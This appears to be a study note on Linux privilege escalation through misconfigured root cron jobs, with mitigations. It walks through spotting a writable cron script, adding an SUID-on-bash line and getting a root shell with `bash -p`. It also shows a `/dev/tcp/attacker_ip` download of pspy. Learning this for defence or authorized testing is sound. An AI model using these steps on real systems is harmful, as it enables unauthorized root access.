A **cron** job is a scheduled task on Unix/Linux systems that runs at a specific time or at regular intervals. These tasks are defined in a **crontab** file, which specifies what commands should be executed and when they should be executed.

Detecting and exploiting cron jobs is a technique used by attackers to escalate their privileges on a compromised system. For example, if an attacker detects that a file is being executed by the "root" user through a cron job that runs at regular intervals, and notices that the permissions on the file are misconfigured, they could manipulate the file's content to include malicious instructions. These instructions would then be executed with elevated privileges as the 'root' user, since that is the user executing the file.

To detect cron jobs, attackers can use tools like **Pspy**. Pspy is a command-line tool that monitors background tasks on a Unix/Linux system and displays newly started tasks.

To reduce the chances of an attacker exploiting cron jobs on a system, it is recommended to implement the following measures:

- **Limit the number of cron jobs**: It is important to limit the number of cron jobs running on the system and ensure that only tasks requiring special permissions are granted those permissions. This reduces the attack surface and lowers the chances of an attacker finding a vulnerable cron job.
- **Verify cron job permissions**: It is important to review the permissions of cron jobs to ensure that only authorized users and groups are granted access. Additionally, it is recommended to avoid granting superuser permissions to cron jobs unless absolutely necessary.
- **Regularly monitor the system**: It is important to regularly monitor the system to detect unexpected changes in cron jobs and to identify potential security breaches. Additionally, it is recommended to use security monitoring tools to detect suspicious activities on the system.
- **Configure cron job logging**: It is recommended to enable logging for cron jobs to identify any suspicious activity in the defined tasks and to maintain a record of the activities performed by each of these tasks.

Let's assume we are listing directories on a compromised machine and suddenly come across a script. When we run `ls -l`, we see that it has root permissions:
![[Pasted image 20260213203055.png]]
Upon examining it, we see that it is a bash script that tells you who you are and saves the output to a specific path:
![[Pasted image 20260213203130.png]]
We notice that it takes a moment, but suddenly the output appears:
![[Pasted image 20260213203215.png]]
![[Pasted image 20260213203228.png]]

This is the initial way to view the script without having to search for it.

Let's assume we are in a completely different writable directory than where the script is located. With `ps -eo user,command`, we could see the commands currently being executed on the system:
![[Pasted image 20260213203512.png]]
We could create a bash script to continuously run this command, allowing us to see all commands in real-time:
![[Pasted image 20260213203613.png]]
Here we see that root has executed a scheduled cron job, and just below, we see what was executed:
![[Pasted image 20260213203806.png]]
We navigate to the path and see that the script is editable due to its permissions:
![[Pasted image 20260213203844.png]]
So, if we edit it and grant SUID privileges to bash:
![[Pasted image 20260213204007.png]]
Now, when the scheduled task runs, we will see the permissions on bash change:
![[Pasted image 20260213204057.png]]
![[Pasted image 20260213204106.png]]
Now, simply by running `bash -p`, we open a shell with root privileges:
![[Pasted image 20260213204147.png]]

Another simpler method would be to use [pspy](https://github.com/DominicBreuker/pspy). We download it on our attacking machine and transfer it using `curl` or `wget`. If neither is available, we could simply set up a listener with `nc` to share the pspy file and use `cat < /dev/tcp/attacker_ip/port > pspy`:
![[Pasted image 20260213204550.png]]
We then give execution permissions to pspy:
![[Pasted image 20260213204628.png]]
![[Pasted image 20260213204636.png]]
